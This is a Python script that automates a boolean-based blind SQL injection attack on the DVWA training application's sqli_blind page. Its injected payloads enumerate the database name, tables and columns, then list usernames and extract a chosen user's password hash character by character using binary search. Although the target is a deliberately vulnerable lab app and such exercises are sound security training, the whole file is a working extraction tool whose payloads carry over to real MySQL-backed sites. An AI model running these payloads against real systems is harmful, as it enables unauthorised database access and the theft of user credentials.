from utils import DVWASQLiResponseParser, DVWASessionProxy, SecurityLevel
import string

def get_query_result(session, target_url, query, *query_parameters):
    """
    Executes a SQL query against a specified URL and checks for the presence of a specific response.

    :param session: The session object to maintain state across requests.
    :param target_url: The URL where the SQL injection vulnerability exists.
    :param query: The SQL query to be executed.
    :param query_parameters: Parameters to format the query string.
    :return: True if the query indicates presence (e.g., a condition is met), False otherwise.
    """
    try:
        # Formats the query with provided parameters.
        formatted_query = query.format(*query_parameters)
        # Sends a request to the target URL with the SQL query.
        response = session.get(f"{target_url}?id={formatted_query}&Submit=Submit#")
        # Parses the response to determine if the query's condition was met.
        parser = DVWASQLiResponseParser(response)
        return parser.check_presence("exist")
    except AttributeError as error:
        return False

if __name__ == "__main__":

    query_counter = 0  # Initialize the query counter

    # Prompt user for the DVWA server IP address
    dvwa_server_ip = input("Enter the DVWA server IP address: ")
    base_url = f"http://{dvwa_server_ip}"
    sqli_page_url = f"{base_url}/vulnerabilities/sqli_blind"
    
    # Initialize session and set security level.
    with DVWASessionProxy(base_url) as session:
        session.security = SecurityLevel.LOW

        # Query to find the length of the database name.
        db_name_length_query = "1' AND LENGTH(DATABASE()) = {} %23"
        db_name_length = 0
        for length in range(10):
            if get_query_result(session, sqli_page_url, db_name_length_query, length):
                print(f"[+] Length of the database name is {length}")
                db_name_length = length
                break
            query_counter += 1
        print(f"Queries made to find database name length: {query_counter}\n")
        query_counter = 0

        # Query to find the actual database name one character at a time.
        db_name_query = "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}'%23"
        db_name = []

        for position in range(1, db_name_length + 1):
            for character in string.ascii_lowercase:
                if get_query_result(session, sqli_page_url, db_name_query, position, character):
                    db_name.append(character)
                    break
                query_counter += 1
        db_name = "".join(db_name)
        print(f'[+] Database name discovered: {db_name}')
        print(f"Queries made to find database name: {query_counter}\n")
        query_counter = 0
        
        # Query to count the number of tables in the database.
        tables_count_query = "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{}')='{}'%23"
        tables_count = 0
        for count in range(1, 10):
            if get_query_result(session, sqli_page_url, tables_count_query, db_name, count):
                print(f"[+] Number of tables in the database: {count}")
                tables_count = count
                break
            query_counter += 1
        print(f"Queries made to find number of tables: {query_counter}\n")
        query_counter = 0

        # Query to find the names of tables one character at a time.
        table_name_query = "1' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' {} LIMIT 1),{},1)='{}'%23"
        
        found_tables = [[] for _ in range(tables_count)]
        exclusion_clause = ""
        for table_index in range(tables_count):        
            for position in range(1, 10):
                for character in string.ascii_lowercase:
                    if get_query_result(session, sqli_page_url, table_name_query, db_name, exclusion_clause, position, character):
                        found_tables[table_index].append(character)
                        break
                    query_counter += 1
            print("\t", "".join(found_tables[table_index]))
            exclusion_clause += f" AND table_name <> '{''.join(found_tables[table_index])}'"
        print(f"Queries made to find table names: {query_counter}\n")
        query_counter = 0

        # Prompt user to specify which table to analyze further.
        target_table_name = input("Enter the name of the table to analyze: ")
        # Query to determine the number of columns in the target table.
        columns_count_query = "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}')='{}'%23"
        
        columns_count = 0
        for count in range(1, 10):
            if get_query_result(session, sqli_page_url, columns_count_query, target_table_name, count):
                print(f"[+] Number of columns in '{target_table_name}': {count}")
                columns_count = count
                break
            query_counter += 1
        print(f"Queries made to find number of columns: {query_counter}\n")
        query_counter = 0

        # Query to find the names of columns in the target table one character at a time.
        column_name_query = "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}'%23"
        
        found_column_names = [[] for _ in range(columns_count)]
        
        print("[!] Attempting to accelerate the process. Press CTRL+C when you find the target columns.")
        try:
            for column_index in range(columns_count):        
                for character_position in range(1, 12):
                    for character in string.ascii_lowercase:
                        if get_query_result(session, sqli_page_url, column_name_query, target_table_name, column_index, character_position, character):
                            found_column_names[column_index].append(character)
                            break
                        query_counter += 1
                print("\t", "".join(found_column_names[column_index]))
            print(f"Queries made to find column names: {query_counter}\n")
            query_counter = 0
        except KeyboardInterrupt:
            print("\nUser discovery halted!")
            query_counter = 0

        # User inputs for targeting specific columns within the chosen table.
        users_column = input("Enter the username column name: ")
        passwords_hash_column = input("Enter the password hash column name: ")

# Query to extract values from the specified column of the target table, one character at a time.
        value_extraction_query = "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}'%23"
        
        found_users = [[] for _ in range(10)]
        
        print("[!] To further speed up the process, press CTRL+C when you find the target user")
        try:
            for user_index in range(10):        
                for character_position in range(1, 12):
                    for character in string.ascii_letters + string.digits:
                        if get_query_result(session, sqli_page_url, value_extraction_query, users_column, target_table_name, user_index, character_position, character):
                            found_users[user_index].append(character)
                            break
                        query_counter += 1
                print("|", "_"*10, "".join(found_users[user_index]))
            print(f"Queries made to extract values from columns: {query_counter}\n")
            query_counter = 0
        except KeyboardInterrupt:
            print("\nUser discovery halted!")
            query_counter = 0

        # User input for specifying the target username for password hash extraction.
        target_username = input("Enter the target username for password hash extraction: ")

        # Query to determine the length of the password hash for the specified user.
        # Initialize the minimum and maximum possible lengths for the password hash.
        # This is based on the expected hash type, e.g., SHA-256 hashes are typically 64 characters long.
        min_length = 1
        max_length = 64  # Adjust based on expected hash type
        password_hash_length = 0 # Initialize variable to store the determined length of the password hash.

        # Use binary search to efficiently determine the password hash length.
        # This loop repeatedly narrows down the range of possible lengths based on query responses.
        while min_length <= max_length:
            # Calculate the midpoint of the current length range.
            mid_length = (min_length + max_length) // 2
            # Prepare the SQL injection query to check if the hash length is less than or equal to mid_length.
            length_query = "1' AND LENGTH((SELECT {} FROM {} WHERE {}='{}'))<={}-- "
            # Execute the query. If the condition is true, it means the actual length is less than or equal to mid_length.
            if get_query_result(session, sqli_page_url, length_query.format(passwords_hash_column, target_table_name, users_column, target_username, mid_length)):
                # Update the length and adjust the maximum length for the next iteration.
                password_hash_length = mid_length
                max_length = mid_length - 1
            else:
                # If the condition is false, adjust the minimum length for the next iteration.
                min_length = mid_length + 1

        print(f"[+] Length of the password hash for '{target_username}': {password_hash_length}")
        query_counter += 1
        print(f"Queries made to find password hash length: {query_counter}\n")
        query_counter = 0

        # Query to extract the password for the specified user, one character at a time.
        # Begin the process of extracting the password hash one character at a time.
        password_hash = ""

        # Iterate over each position in the password hash, from the first to the last character.
        for position in range(1, password_hash_length + 1):
            # Initialize the ASCII range for printable characters to search.
            min_char = 32  # Starting ASCII value for printable characters
            max_char = 126  # Ending ASCII value for printable characters
            # Variable to store the found character ASCII value.
            found_char = None
            # Use binary search within the ASCII range to find the correct character at the current position.
            while min_char <= max_char:
                # Calculate the midpoint in the current ASCII range.
                mid_char = (min_char + max_char) // 2
                # Prepare the SQL injection query to check if the ASCII value of the current character is less than or equal to mid_char.
                char_query = "1' AND ASCII(SUBSTR((SELECT {} FROM {} WHERE {}='{}' LIMIT 1), {}, 1))<={}-- "
                # Execute the query. If true, adjust the search to the lower half; otherwise, to the upper half.
                if get_query_result(session, sqli_page_url, char_query.format(passwords_hash_column, target_table_name, users_column, target_username, position, mid_char)):
                    found_char = mid_char
                    max_char = mid_char - 1
                else:
                    min_char = mid_char + 1
            # Once the correct character is found, append it to the password hash string.
            if found_char is not None:
                password_hash += chr(found_char)
                # print(f"Found character at position {position}: {chr(found_char)}")
                query_counter += 1

        print(f"[+] Password hash for '{target_username}': {password_hash}")
        print(f"Queries made to extract password hash: {query_counter}\n")
        query_counter = 0